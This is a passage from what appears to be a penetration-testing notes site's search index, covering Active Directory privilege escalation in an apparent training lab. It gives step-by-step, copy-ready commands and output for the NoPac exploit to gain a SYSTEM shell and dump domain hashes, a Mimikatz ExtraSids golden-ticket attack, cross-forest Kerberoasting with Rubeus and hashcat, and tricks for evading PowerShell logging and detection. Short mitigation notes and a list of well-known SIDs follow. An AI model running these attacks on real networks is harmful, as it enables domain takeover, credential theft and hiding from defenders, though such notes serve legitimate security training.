inlanefreight.local/forend:Klmcargo2@172.16.5.5 '\\\\172.16.5.225\\CompData\\backupscript.dll'\n</code></pre> <p>The payload will then call back to our multi handler giving us an elevated SYSTEM shell.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#nopac-samaccountname-spoofing","title":"\ud83e\udea4 NoPac (SamAccountName Spoofing)","text":"<p>Detailed explanations</p> <ul> <li>noPac: A Tale of Two Vulnerabilities That Could End in Ransomware.</li> <li>SAM Name impersonation.</li> </ul> <p>This vulnerability encompasses two CVEs\u00a02021-42278\u00a0and\u00a02021-42287, allowing for intra-domain privilege escalation from any standard domain user to Domain Admin level access in one single command.</p> 42278 42287 <code>42278</code>\u00a0is a bypass vulnerability with the Security Account Manager (SAM). <code>42287</code>\u00a0is a vulnerability within the Kerberos Privilege Attribute Certificate (PAC) in ADDS. <pre><code># Ensuring Impacket is Installed\ngit clone https://github.com/SecureAuthCorp/impacket.git\n\npython setup.py install \n\n# Cloning the NoPac Exploit Repo\ngit clone https://github.com/Ridter/noPac.git\n</code></pre> <p>Once Impacket is installed and we ensure the repo is cloned to our attack box, we can use the scripts in the NoPac directory to check if the system is vulnerable using a scanner (scanner.py) then use the exploit (noPac.py) to gain a shell as NT AUTHORITY/SYSTEM. </p> <pre><code># First we will scan:\nsudo python3 scanner.py $domain/$userSamAccounName:$password -dc-ip $domainControllerIP -use-ldap\n# Example:\n# sudo python3 scanner.py inlanefreight.local/forend:Klmcargo2 -dc-ip 172.16.5.5 -use-ldap\n</code></pre> <p>We will obtain the <code>ms-DS-MachineAccountQuota</code> number. If it is set to 0, the attack will not work.</p> <pre><code># Running NoPac &amp; Getting a semi-interactive shell session \u00a0using\u00a0smbexec.py -https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py. This could be \"noisy\" or may be blocked by AV or EDR.\nsudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname -shell --impersonate $userAdmin -use-ldap\n# Example: \n# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 -shell --impersonate administrator -use-ldap\n</code></pre> <p>Important: It is important to note that NoPac.py does save the TGT in the directory on the attack host where the exploit was run (We can use\u00a0<code>ls</code>\u00a0to confirm).</p> <pre><code># We could then use the cache file to perform a pass-the-ticket and perform further attacks such as DCSync.  Using noPac to DCSync the Built-in Administrator Account\nsudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc-user $domain/$userAdmin\n# Example:\n# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc-user INLANEFREIGHT/administrator\n\n# We can also dump all\nsudo python3 noPac.py $domain/$user:$password -dc-ip $domainControllerIP -dc-host $hostname --impersonate $userAdmin -use-ldap -dump -just-dc\n# Example:\n# sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5  -dc-host ACADEMY-EA-DC01 --impersonate administrator -use-ldap -dump -just-dc\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#mitigations","title":"Mitigations","text":"<p>If opsec or being \"quiet\" is a consideration during an assessment, we would most likely want to avoid a tool like smbexec.py.</p> <p>If Windows Defender (or another AV or EDR product) is enabled on a target, our shell session may be established, but issuing any commands will likely fail. </p> <p>The first thing smbexec.py does is create a service called\u00a0<code>BTOBTO</code>. Another service called\u00a0<code>BTOBO</code>\u00a0is created, and any command we type is sent to the target over SMB inside a .bat file called\u00a0<code>execute.bat</code>. With each new command we type, a new batch script is created and echoed to a temporary file that executes said script and deletes it from the system. Let's look at a Windows Defender log to see what behavior was considered malicious.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#exchange-related-group-membership","title":"\ud83d\udcb1  Exchange Related Group Membership","text":"<p>See some techniques at: https://github.com/gdedrouas/Exchange-AD-Privesc This repository provides a few techniques and scripts regarding the impact of Microsoft Exchange deployment on Active Directory security. This is a side project of AD-Control-Paths, an AD permissions auditing project to which I recently added some Exchange-related modules.</p> <ul> <li>The group\u00a0<code>Exchange Windows Permissions</code>\u00a0is not listed as a protected group, but members are granted the ability to write a DACL to the domain object.</li> <li>The Exchange group\u00a0<code>Organization Management</code>\u00a0is another extremely powerful group (effectively the \"Domain Admins\" of Exchange) and can access the mailboxes of all domain users. It is not uncommon for sysadmins to be members of this group. This group also has full control of the OU called\u00a0<code>Microsoft Exchange Security Groups</code>, which contains the group\u00a0<code>Exchange Windows Permissions</code>.</li> </ul> <p>If we can compromise an Exchange server, this will often lead to Domain Admin privileges. </p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#attacking-domain-trusts-1-child-parent-trusts","title":"\ud83d\udc40 Attacking Domain Trusts # 1: Child -&gt; Parent Trusts","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#extrasids-attack-mimikatz","title":"ExtraSids Attack - Mimikatz","text":"<p>The sidHistory attribute is used in migration scenarios. If a user in one domain is migrated to another domain, a new account is created in the second domain. The original user's SID will be added to the new user's SID history attribute, ensuring that the user can still access resources in the original domain.</p> <p>The attack explained in a nugshell:</p> <ul> <li>Using Mimikatz, an attacker can perform SID history injection and add an administrator account to the SID History attribute of an account they control.</li> <li>When logging in with this account, all of the SIDs associated with the account are added to the user's token.</li> <li>If the SID of a Domain Admin account is added to the SID History attribute of this account, then this account will be able to perform DCSync and create a\u00a0Golden Ticket\u00a0or a Kerberos ticket-granting ticket (TGT), which will allow for us to authenticate as any account in the domain of our choosing for further persistence.</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#introduction-to-sid-history-and-sid-filtering","title":"Introduction to SID History and SID Filtering","text":"<p>SID Filtering\u00a0prevents such abuse by verifying and blocking unauthorized or suspicious SIDs during authentication across a trust.</p> <p>SID History exists specifically to allow migrated users to access resources in the original domain. Enabling SID Filtering disrupts this functionality by ignoring SID history during authentication across trust boundaries. This trade-off arises because:</p> <ol> <li> <p>Functionality Comes with Risk:     Allowing SID history in a trust scenario opens the door for privilege escalation attacks through SID injection.</p> </li> <li> <p>SID History is Not Always Needed:</p> </li> <li> <p>In many migration scenarios, users may no longer need access to the original domain once migration is complete. In such cases, the risks of allowing SID history outweigh the benefits.</p> </li> <li> <p>SID Filtering is particularly useful in inter-forest or external trust scenarios where one environment does not fully trust the security practices of the other.</p> </li> <li> <p>Balancing Security and Usability:    Organizations must evaluate their specific requirements. If SID history functionality is crucial, SID Filtering can be disabled selectively for specific trusts while mitigating risks through other means (e.g., enhanced monitoring or strict trust policies).</p> </li> </ol> <p>Why SID Filtering is Still Useful</p> <p>While SID Filtering blocks the main functionality of SID history, its purpose is not to disable SID history entirely but to control where and when SID history can be used:</p> <ul> <li> <p>Within the Same Forest:   SID Filtering is typically not applied to intra-forest authentication because all domains in a forest share the same schema and security boundary. SID History works seamlessly here.  Example: Users migrating between domains in the same forest (<code>DomainA.local</code> to <code>DomainB.local</code>) can use SID history without interference.</p> </li> <li> <p>Between Different Forests:     Trusts between forests (or external domains) are high-risk. SID Filtering ensures that only valid SIDs from the trusted forest or domain are honored, blocking any unauthorized or injected SIDs.</p> </li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#the-attack","title":"The attack","text":"<p>To perform this attack after compromising a child domain, we need the following:</p> <ul> <li>The KRBTGT hash for the child domain</li> <li>The SID for the child domain</li> <li>The name of a target user in the child domain (does not need to exist!)</li> <li>The FQDN of the child domain.</li> <li>The SID of the Enterprise Admins group of the root domain.</li> <li>With this data collected, the attack can be performed with Mimikatz.</li> </ul>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-1-getting-the-krbtgt-hash-from-the-child-domain","title":"Step 1: getting the KRBTGT hash from the child domain","text":"<p>First, we need to obtain the NT hash for the\u00a0KRBTGT\u00a0account, which is a service account for the Key Distribution Center (KDC) in Active Directory.</p> <p>Since we have compromised the child domain, we can log in as a Domain Admin or similar and perform the DCSync attack to obtain the NT hash for the KRBTGT account.</p> <pre><code># Go to mimikatz.exe file in the explorer and execute as admin\n\nlsadump::dcsync /user:$domain\\$user\n# Example:\n# .\\mimikatz.exe\n# lsadump::dcsync /user:LOGISTICS\\krbtgt\n</code></pre> <p>Results:</p> <pre><code>[DC] 'LOGISTICS.INLANEFREIGHT.LOCAL' will be the domain\n[DC] 'ACADEMY-EA-DC02.LOGISTICS.INLANEFREIGHT.LOCAL' will be the DC server\n[DC] 'LOGISTICS\\krbtgt' will be the user account\n[rpc] Service  : ldap\n[rpc] AuthnSvc : GSS_NEGOTIATE (9)\n\nObject RDN           : krbtgt\n\n** SAM ACCOUNT **\n\nSAM Username         : krbtgt\nAccount Type         : 30000000 ( USER_OBJECT )\nUser Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )\nAccount expiration   :\nPassword last change : 11/1/2021 10:21:33 AM\nObject Security ID   : S-1-5-21-2806153819-209893948-922872689-502\nObject Relative ID   : 502\n\nCredentials:\n  Hash NTLM: 9d765b482771505cbe97411065964d5f\n    ntlm- 0: 9d765b482771505cbe97411065964d5f\n    lm  - 0: 69df324191d4a80f0ed100c10f20561e\n\nSupplemental Credentials:\n\nSNIP\n</code></pre> <p>KRBTGT hash : <code>9d765b482771505cbe97411065964d5f</code>.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-2-getting-the-sid-for-the-child-domain","title":"Step 2: getting the SID for the child domain","text":"<pre><code>Import-Module .\\PowerView.ps1\nGet-DomainSID\n</code></pre> <p>However it was also visible in the Mimikatz output above.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-3-getting-the-name-of-a-target-user-in-the-child-domain-does-not-need-to-exist","title":"Step 3: getting the name of a target user in the child domain (does not need to exist!)","text":"<p>For instance, <code>hacker</code>.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-4-getting-the-fqdn-of-the-child-domain","title":"Step 4: getting the FQDN of the child domain.","text":"<p>It was also visible in the Mimikatz output above: <code>LOGISTICS.INLANEFREIGHT.LOCAL</code>.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-5-getting-the-sid-of-the-enterprise-admins-group-of-the-root-domain","title":"Step 5: getting the SID of the Enterprise Admins group of the root domain","text":"<p>Next, we can use\u00a0<code>Get-DomainGroup</code>\u00a0from PowerView to obtain the SID for the Enterprise Admins group in the parent domain. </p> <pre><code>Get-DomainGroup -Domain $domain -Identity \"$GroupName\" | select distinguishedname,objectsid\n# Example: \n# Get-DomainGroup -Domain INLANEFREIGHT.LOCAL -Identity \"Enterprise Admins\" | select distinguishedname,objectsid\n</code></pre> <p>We could also do this with the\u00a0Get-ADGroup\u00a0cmdlet:</p> <pre><code>Get-ADGroup -Identity \"$GroupName\" -Server \"$DomainServer\"`\n# Example: \n# Get-ADGroup -Identity \"Enterprise Admins\" -Server \"INLANEFREIGHT.LOCAL\"\n</code></pre> <p>Results:</p> <pre><code>distinguishedname                                       objectsid\n-----------------                                       ---------\nCN=Enterprise Admins,CN=Users,DC=INLANEFREIGHT,DC=LOCAL S-1-5-21-3842939050-3880317879-2865463114-519\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#step-6-the-attack","title":"Step 6: The attack","text":"<ul> <li>The KRBTGT hash for the child domain:\u00a0<code>9d765b482771505cbe97411065964d5f</code></li> <li>The SID for the child domain:\u00a0<code>S-1-5-21-2806153819-209893948-922872689</code></li> <li>The name of a target user in the child domain (does not need to exist to create our Golden Ticket!): We'll choose a fake user:\u00a0<code>hacker</code></li> <li>The FQDN of the child domain:\u00a0<code>LOGISTICS.INLANEFREIGHT.LOCAL</code></li> <li>The SID of the Enterprise Admins group of the root domain:\u00a0<code>S-1-5-21-3842939050-3880317879-2865463114-519</code></li> </ul> <p>Before the attack, we can confirm no access to the file system of the DC in the parent domain:</p> <pre><code># List C: in the parent domain:\nls \\\\$parenhostname.$domain\\c$\n# Example: \n# ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n</code></pre> <p>Using Mimikatz and the data listed above, we can create a Golden Ticket to access all resources within the parent domain.</p> <pre><code>kerberos::golden /user:$madeupUserName /domain:$targetedFQDN /sid:$sidTargetedDomain /krbtgt:$NTLMhashOfKRBTGTaccountDomain  /sids:$SIDofEnterpriseAdminGroup /ptt\n\n# Example:\n# kerberos::golden /user:hacker /domain:LOGISTICS.INLANEFREIGHT.LOCAL /sid:S-1-5-21-2806153819-209893948-922872689 /krbtgt:9d765b482771505cbe97411065964d5f /sids:S-1-5-21-3842939050-3880317879-2865463114-519 /ptt\n</code></pre> <p>Now, let's list the kerberos tickets in memory:</p> <pre><code>klist\n</code></pre> <p>Now we can perform actions in the parent domain, such as reading a flag:</p> <pre><code># List C: in the parent domain:\nls \\\\$parenhostname.$domain\\c$\n# Example: \n# ls \\\\academy-ea-dc01.inlanefreight.local\\c$\n\n# Read the flag\ncat \\\\$parenhostname.$domain\\c$path\\to\\file.txt\n# Example: \n# cat \\\\academy-ea-dc01.inlanefreight.local\\c$\\ExtraSids\\flag.txt\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#cross-forest-kerberoasting","title":"Cross-Forest Kerberoasting","text":"<p>Sometimes you cannot escalate privileges in your current domain, but instead can obtain a Kerberos ticket and crack a hash for an administrative user in another domain that has Domain/Enterprise Admin privileges in both domains.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#enumerating-spns","title":"Enumerating SPNs","text":"<p>Enumerating Accounts for Associated SPNs Using Get-DomainUser:</p> <pre><code>Get-DomainUser -SPN -Domain $TargetDomain | select SamAccountName\n# Example:\n# Get-DomainUser -SPN -Domain FREIGHTLOGISTICS.LOCAL | select SamAccountName\n</code></pre> <p>Results:</p> <pre><code>samaccountname\n--------------\nkrbtgt\nmssqlsvc\n</code></pre> <p>There is one account with an SPN in the target domain. </p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#getting-which-groups-is-spm-member-of","title":"Getting which groups is SPM member of","text":"<p>A quick check shows that this account is a member of the Domain Admins group in the target domain.</p> <pre><code>Get-DomainUser -Domain $TargetDomain -Identity $interestingUserSamAccountName | select samaccountname,memberof\n# Example:\n# Get-DomainUser -Domain FREIGHTLOGISTICS.LOCAL -Identity mssqlsvc | select samaccountname,memberof\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#performing-a-kerberoasting-attacking-with-rubeus-using-domain-flag","title":"Performing a Kerberoasting Attacking with Rubeus Using /domain Flag","text":"<pre><code>.\\Rubeus.exe kerberoast /domain:$TargetDomain /user:$interestingUserSamAccountName /nowrap\n# Example: \n# .\\Rubeus.exe kerberoast /domain:FREIGHTLOGISTICS.LOCAL /user:mssqlsvc /nowrap\n</code></pre> <p>When getting the kerberos ticket, we can crack it: </p> <pre><code>hashcat -m 13100 ticketTocrack /usr/share/wordlists/rockyou.txt \n# Results: 1logistics\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#admin-password-re-use-group-membership","title":"Admin Password Re-Use &amp; Group Membership","text":"<p>From time to time, we'll run into a situation where there is a bidirectional forest trust managed by admins from the same company. We may see a Domain Admin or Enterprise Admin from Domain A as a member of the built-in Administrators group in Domain B in a bidirectional forest trust relationship. If we can take over this admin user in Domain A, we would gain full administrative access to Domain B based on group membership.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#using-get-domainforeigngroupmember","title":"Using Get-DomainForeignGroupMember","text":"<p>For instance,  the\u00a0<code>FREIGHTLOGISTICS.LOCAL</code>\u00a0domain with which we have an external bidirectional forest trust.</p> <pre><code>Get-DomainForeignGroupMember -Domain $targeteddomain\n# Example:\n# Get-DomainForeignGroupMember -Domain FREIGHTLOGISTICS.LOCAL\n</code></pre> <p>Results: <pre><code>GroupDomain             : FREIGHTLOGISTICS.LOCAL\nGroupName               : Administrators\nGroupDistinguishedName  : CN=Administrators,CN=Builtin,DC=FREIGHTLOGISTICS,DC=LOCAL\nMemberDomain            : FREIGHTLOGISTICS.LOCAL\nMemberName              : S-1-5-21-3842939050-3880317879-2865463114-500\nMemberDistinguishedName : CN=S-1-5-21-3842939050-3880317879-2865463114-500,CN=ForeignSecurityPrincipals,DC=FREIGHTLOGIS\n                          TICS,DC=LOCAL\n</code></pre></p> <p>If we convert the SID to name: <pre><code>Convert-SidToName S-1-5-21-3842939050-3880317879-2865463114-500\n# Results: INLANEFREIGHT\\administrator\n</code></pre></p> <p>Meaning that the built-in Administrators group in\u00a0<code>FREIGHTLOGISTICS.LOCAL</code>\u00a0has the built-in Administrator account for the\u00a0<code>INLANEFREIGHT.LOCAL</code>\u00a0domain as a member.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#accessing-dc03-using-enter-pssession","title":"Accessing DC03 Using Enter-PSSession","text":"<pre><code>Enter-PSSession -ComputerName $hostname.$targeteddomain -Credential $ParentDomain\\administrator\n# Example:\n# Enter-PSSession -ComputerName ACADEMY-EA-DC03.FREIGHTLOGISTICS.LOCAL -Credential INLANEFREIGHT\\administrator\n# From the command output above, we can see that we successfully authenticated to the Domain Controller in the\u00a0`FREIGHTLOGISTICS.LOCAL`\u00a0domain using the Administrator account from the\u00a0`INLANEFREIGHT.LOCAL`\u00a0domain\n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#sid-history-abuse-cross-forest","title":"SID History Abuse - Cross Forest","text":"<p>SID History can also be abused across a forest trust. If a user is migrated from one forest to another and SID Filtering is not enabled, it becomes possible to add a SID from the other forest.</p> <p>If the SID of an account with administrative privileges in Forest A is added to the SID history attribute of an account in Forest B, assuming they can authenticate across the forest, then this account will have administrative privileges when accessing resources in the partner forest.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#evasion-techniques","title":"Evasion Techniques","text":"","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#downgrade-powershell","title":"Downgrade Powershell","text":"<p>Many defenders are unaware that several versions of PowerShell often exist on a host. If not uninstalled, they can still be used. Powershell event logging was introduced as a feature with Powershell 3.0 and forward. With that in mind, we can attempt to call Powershell version 2.0 or older. If successful, our actions from the shell will not be logged in Event Viewer. </p> <p>With\u00a0Script Block Logging\u00a0enabled, we can see that whatever we type into the terminal gets sent to this log. If we downgrade to PowerShell V2, this will no longer function correctly. Our actions after will be masked since Script Block Logging does not work below PowerShell 3.0.</p> <pre><code>powershell.exe -version 2\n</code></pre> <p>PowerShell Operational Logs are kept under under\u00a0<code>Applications and Services Logs &gt; Microsoft &gt; Windows &gt; PowerShell &gt; Operational</code>. Also the <code>Windows PowerShell</code>\u00a0log is located at\u00a0<code>Applications and Services Logs &gt; Windows PowerShell</code>.</p>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#net-commands-trick","title":"Net Commands Trick","text":"<p>Typing\u00a0<code>net1</code>\u00a0instead of\u00a0<code>net</code>\u00a0will execute the same functions without the potential trigger from the net string. Example:</p> <pre><code>net1 user /domain   \n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-from-windows-privilege-escalation/#mitigations_1","title":"Mitigations","text":"<ol> <li><code>Auditing for and removing dangerous ACLs</code></li> </ol> <p>Organizations should have regular AD audits performed but also train internal staff to run tools such as BloodHound and identify potentially dangerous ACLs that can be removed.</p> <ol> <li><code>Monitor group membership</code></li> </ol> <p>Visibility into important groups is paramount. All high-impact groups in the domain should be monitored to alert IT staff of changes that could be indicative of an ACL attack chain.</p> <ol> <li><code>Audit and monitor for ACL changes</code></li> </ol> <p>Enabling the\u00a0Advanced Security Audit Policy\u00a0can help in detecting unwanted changes, especially\u00a0Event ID 5136: A directory service object was modified\u00a0which would indicate that the domain object was modified, which could be indicative of an ACL attack. If we look at the event log after modifying the ACL of the domain object, we will see some event ID\u00a0<code>5136</code>\u00a0created. If we check out the\u00a0<code>Details</code>\u00a0tab, we can see that the pertinent information is written in\u00a0Security Descriptor Definition Language (SDDL)\u00a0which is not human readable.</p> <p>We can use the\u00a0ConvertFrom-SddlString cmdlet\u00a0to convert this to a readable format.</p> <pre><code># Converting the SDDL String into a Readable Format\nConvertFrom-SddlString \"O:BAG:BAD:AI(D;;DC;;;WD)(OA;CI;CR;ab721a53-1e2f-11d0-9819-00aa0040529b;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CI;CR;00299570-246d-11d0-a768-00aa006e0529;bf967aba-0de6-11d0-a285-00aa003049e2;S-1-5-21-3842939050-3880317879-2865463114-5189)(OA;CIIO;CCDCLC;c975c901-[CUT]\" \n</code></pre>","tags":["active directory","ldap","windows"]},{"location":"active-directory-security-identifiers/","title":"Interesting Windows Computer &amp; Active Directory Well-Known Security Identifiers (SIDs)","text":"<p>Source: https://adsecurity.org/?p=1001</p>","tags":["active","directory"]},{"location":"active-directory-security-identifiers/#the-microsoft-knowledge-base-article-kb243330-lists-the-well-known-security-identifiers-in-windows-operating-systems","title":"The\u00a0Microsoft Knowledge Base article KB243330 lists the well-known security identifiers in Windows operating systems","text":"<p>Listed here are the more interesting ones from the article as well as some additional ones.</p>","tags":["active","directory"]},{"location":"active-directory-security-identifiers/#local-computer-sids","title":"**Local Computer SIDs","text":"<p>**</p> <p>SID: S-1-5-2 Name: Network Description: A group that includes all users that have logged on through a network connection. Membership is controlled by the operating system.</p> <p>SID: S-1-5-6 Name: Service Description: A group that includes all security principals that have logged on as a service. Membership is controlled by the operating system.</p> <p>SID: S-1-5-9 Name: Enterprise Domain Controllers Description: A group that includes all domain controllers in a forest that uses an Active Directory directory service. Membership is controlled by the operating system.</p> <p>SID: S-1-5-11 Name: Authenticated Users Description: A group that includes all users whose identities were authenticated when they logged on. Membership is controlled by the operating system.</p> <p>SID: S-1-5-18 Name: Local System Description: A service account that is used by the operating system.</p> <p>SID: S-1-5-19 Name: NT Authority Description: Local Service</p> <p>SID: S-1-5-20 Name: NT Authority Description: Network Service</p>","tags":["active","directory"]},{"location":"active-directory-security-identifiers/#new-local-computer-sids-in-windows-81-windows-2012-r2-and-earlier-operating-systems-with-kb2871997","title":"New Local Computer SIDs in Windows 8.1, Windows 2012 R2, and earlier operating systems (with KB2871997):","text":"<p>LOCAL_ACCOUNT (S-1-5-113) \u2013 any local account LOCAL_ACCOUNT_AND_MEMBER_OF_ADMINISTRATORS_GROUP (S-1-5-114)</p>","tags":["active","directory"]},{"location":"active-directory-security-identifiers/#active-directory-domain-sids","title":"**Active Directory Domain SIDs\u2019","text":"<p>**</p> <p>SID: S-1-5-21-500 Name: Administrator Description: A user account for the system administrator. By default, it is the only user account that is given full control over the system. <p>SID: S-1-5-21-501 Name: Guest Description: A user account for people who do not have individual accounts. This user account does not require a password. By default, the Guest account is disabled. <p>SID: S-1-5-21-502 Name: KRBTGT Description: A service account that is used by the Key Distribution Center (KDC) service. <p>SID: S-1-5-21-512 Name: Domain Admins Description: A global group whose members are authorized to administer the domain. By default, the Domain Admins group is a member of the Administrators group on all computers that have joined a domain, including the domain controllers. Domain Admins is the default owner of any object that is created by any member of the group. <p>SID: S-1-5-21-513 Name: Domain Users Description: A global group that, by default, includes all user accounts in a domain. When you create a user account in a domain, it is added to this group by default. <p>SID: S-1-5-21-514 Name: Domain Guests Description: A global group that, by default, has only one member, the domain\u2019s built-in Guest account. <p>SID: S-1-5-21-515 Name: Domain Computers Description: A global group that includes all clients and servers that have joined the domain. <p>SID: S-1-5-21-516 Name: Domain Controllers Description: A global group that includes all domain controllers in the domain. New domain controllers are added to this group by default. <p>SID: S-1-5- 21-498 Name: Enterprise Read-only Domain Controllers Description: A Universal group. Members of this group are Read-Only Domain Controllers in the enterprise New with Windows Server 2008 Active Directory schema (or newer) <p>SID: S-1-5- 21-521 Name: Read-only Domain Controllers Description: A Global group. Members of this group are Read-Only Domain Controllers in the domain New with Windows Server 2008 Active Directory schema (or newer) <p>SID: S-1-5-21-517 Name: Cert Publishers Description: A global group that includes all computers that are running an enterprise certification authority. Cert Publishers are authorized to publish certificates for User objects in Active Directory. <p>SID: S-1-5-21-518 Name: Schema Admins Description: A universal group in a native-mode domain; a global group in a mixed-mode domain. The group is authorized to make schema changes in Active Directory. By default, the only member of the group is the Administrator account for the forest root domain. <p>SID: S-1-5-21-519 Name: Enterprise Admins Description: A universal group in a native-mode domain; a global group in a mixed-mode domain. The group is authorized to make forest-wide changes in Active Directory, such as adding child domains. By default, the only member of the group is the Administrator account for the forest root domain. <p>SID: S-1-5-21-520 Name: Group Policy Creator Owners Description: A global group that is authorized to create new Group Policy objects in Active Directory. By default, the only member of the group is Administrator. <p>SID: S-1-5-32-544 Name: Administrators Description: A built-in group. After the initial installation of the operating system, the only member of the group is the Administrator account. When a computer joins a domain, the Domain Admins group is added to the Administrators group. When a server becomes a domain controller, the Enterprise Admins group also is added to the Administrators group.</p> <p>SID: S-1-5-32-545 Name: Users Description: A built-in group. After the initial installation of the operating system, the only member is the Authenticated Users group. When a computer joins a domain, the Domain Users group is added to the Users group on the computer.</p> <p>SID: S-1-5-32-546 Name: Guests Description: A built-in group. By default, the only member is the Guest account. The Guests group allows occasional or one-time users to log on with limited privileges to a computer\u2019s built-in Guest account.</p> <p>SID: S-1-5-32-548 Name: Account Operators Description: A built-in group that exists only on domain controllers. By default, the group has no members. By default, Account Operators have permission to create, modify, and delete accounts for users, groups, and computers in all containers and organizational units of Active Directory except the Builtin container and the Domain Controllers OU. Account Operators do not have permission to modify the Administrators and Domain Admins groups, nor do they have permission to modify the accounts for members of those groups.</p> <p>SID: S-1-5-32-549 Name: Server Operators Description: A built-in group that exists only on domain controllers. By default, the group has no members. Server Operators can log on to a server interactively; create and delete network shares; start and stop services; back up and restore files; format the hard disk of the computer; and shut down the computer.</p> <p>SID: S-1-5-32-550 Name: Print Operators Description: A built-in group that exists only on domain controllers. By default, the only member is the Domain Users group. Print Operators can manage printers and document queues.</p> <p>SID: S-1-5-32-551 Name: Backup Operators Description: A built-in group. By default, the group has no members. Backup Operators can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to the computer and shut it down.</p> <p>SID: S-1-5-32-552 Name: Replicators Description: A built-in group that is used by the File Replication service on domain controllers. By default, the group has no members. Do not add users to this group</p> <p>SID: S-1-5-32-557 Name: BUILTIN\\Incoming Forest Trust Builders Description: An alias. Members of this group can create incoming, one-way trusts to this forest.</p> <p>SID: S-1-5-32-569 Name: BUILTIN\\Cryptographic Operators Description: A Builtin Local group. Members are authorized to perform cryptographic operations. New with Windows Server 2008 Active Directory schema (or newer)</p> <p>SID: S-1-5-21-571 Name: Allowed RODC Password Replication Group Description: A Domain Local group. Members in this group can have their passwords replicated to all read-only domain controllers in the domain. New with Windows Server 2008 Active Directory schema (or newer) <p>SID: S-1-5-21-572 Name: Denied RODC Password Replication Group Description: A Domain Local group. Members in this group cannot have their passwords replicated to any read-only domain controllers in the domain New with Windows Server 2008 Active Directory schema (or newer) <p>SID: S-1-5-32-573 Name: BUILTIN\\Event Log Readers Description: A Builtin Local group. Members of this group can read event logs from local machine. New with Windows Server 2008 Active Directory schema (or newer)</p> <p>SID: S-1-5-32-574 Name: BUILTIN\\Certificate Service DCOM Access Description: A Builtin Local group. Members of this group are allowed to connect to Certification Authorities in the enterprise. New with Windows Server 2008 Active Directory schema (or newer)</p> <p>SID: S-1-5-21-\u2013522 Name: Cloneable Domain Controllers Description: A Global group. Members of this group that are domain controllers may be cloned. New with Windows Server 2012 Active Directory schema (or newer) <p>SID: S-1-5-32-578 Name: BUILTIN\\Hyper-V Administrators Description: A Builtin Local group. Members of this group have complete and unrestricted access to all features of Hyper-V. New with Windows Server 2012 Active Directory schema (or newer)</p> <p>SID: S-1-5-32-579 Name: BUILTIN\\Access Control Assistance Operators Description: A Builtin Local group. Members of this group can remotely query authorization attributes and permissions for resources on this computer. New with Windows Server 2012 Active Directory schema (or newer)</p> <p>SID: S-1-5-32-580 Name: BUILTIN\\Remote Management Users Description: A Builtin Local group. Members of this group can access WMI resources over management protocols (such as WS-Management via the Windows Remote Management service). This applies only to WMI namespaces that grant access to the user. New with Windows Server 2012 Active Directory schema (or newer)</p> <p>SID: S-1-5-64-10 Name: NTLM Authentication Description: A SID that is used when the NTLM authentication package authenticated the client</p> <p>SID: S-1-5-64-14 Name: SChannel Authentication Description: A SID that is used when the SChannel authentication package authenticated the client.</p> <p>SID: S-1-5-64-21 Name: Digest Authentication Description: A SID that is used when the Digest authentication package authenticated the client.</p> <p>SID: S-1-5-80 Name: NT Service Description: An NT Service account prefix</p> <p>SID: S-1-5-80-0 NT SERVICES\\ALL SERVICES Name: All Services Description: A group that includes all service processes that are configured on the system. Membership is controlled by the operating system.</p>","tags":["active","directory"]},{"location":"active-directory/","title":"Active Directory","text":"<p>Related resources</p> <ul> <li>Powershell </li> <li>cmd</li> <li>LDAP</li> </ul> <p>Attacking from linux</p> <ul> <li>Enumerating Active Directory from Linux</li> <li>Attacking Active Directory from Linux</li> <li>Lateral Movement in Active Directory from Linux</li> <li>Privileges escalation in Active Directory from Linux</li> </ul> 